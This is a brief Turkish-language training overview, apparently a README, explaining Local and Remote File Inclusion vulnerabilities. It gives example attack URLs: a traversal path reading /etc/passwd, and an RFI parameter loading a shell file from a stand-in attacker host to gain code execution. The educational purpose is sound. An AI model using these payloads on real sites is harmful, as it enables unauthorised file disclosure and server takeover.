# 🛡️ File Inclusion Vulnerabilities (LFI & RFI)

Bu eğitim, file inclusion zafiyetlerini ve bu zafiyetlere karşı alınabilecek önlemleri kapsar.
Eğitim Özeti

"File Inclusion (LFI/RFI)" eğitimi, web uygulamalarında yerel ve uzak dosya dahil etme zafiyetlerini tespit etmek ve bu zafiyetlere karşı korunma yöntemlerini öğretmeyi amaçlamaktadır. Bu kapsamlı eğitim, LFI (Local File Inclusion) ve RFI (Remote File Inclusion) zafiyetlerinin temel prensiplerini ve çeşitli saldırı tekniklerini detaylı bir şekilde ele alır.

Eğitim içeriğinde, LFI ve RFI zafiyetlerinin nasıl çalıştığını ve bu tür saldırıların nasıl gerçekleştirildiğini pratik örneklerle göstereceğiz. LFI zafiyetlerini tespit etme ve bu zafiyetleri istismar teknikleri üzerinde duracağız. Ayrıca, RFI saldırılarının nasıl yapıldığını inceleyeceğiz.


### 📖 Genel Bakış

File Inclusion, bir uygulamanın kullanıcıdan aldığı dosya yolunu yeterince doğrulamadan kodun içine dahil etmesiyle oluşur. Bu durum, saldırganın yetkisiz dosyalara erişmesine veya zararlı kod yürütmesine neden olur.

## 1. Local File Inclusion (LFI)

"Evin İçindeki Casus"

Saldırganın, sunucunun yerel dosya sistemindeki dosyalara erişmesini sağlar.

    Saldırı Vektörü: Genellikle ../ (Directory Traversal) karakterleri kullanılarak dizinler arası geçiş yapılır.

    Örnek Senaryo:
    https://vulnerable-site.com/view.php?page=../../../../etc/passwd

    Sonuç: Hassas sistem dosyalarının (config, log, user database) sızdırılması.



## 2. Remote File Inclusion (RFI)

"Dışarıdan Gelen Tehdit"

Saldırganın, kendisine ait uzak bir sunucudaki zararlı dosyayı hedef sisteme dahil etmesidir.

    Saldırı Vektörü: Dosya parametresine harici bir URL (http://) enjekte edilir.

    Örnek Senaryo:
    https://vulnerable-site.com/index.php?lang=http://attacker.com/shell.txt

    Sonuç: Uzaktan Kod Çalıştırma (RCE) ve sunucunun tam kontrolünün kaybedilmesi.

    




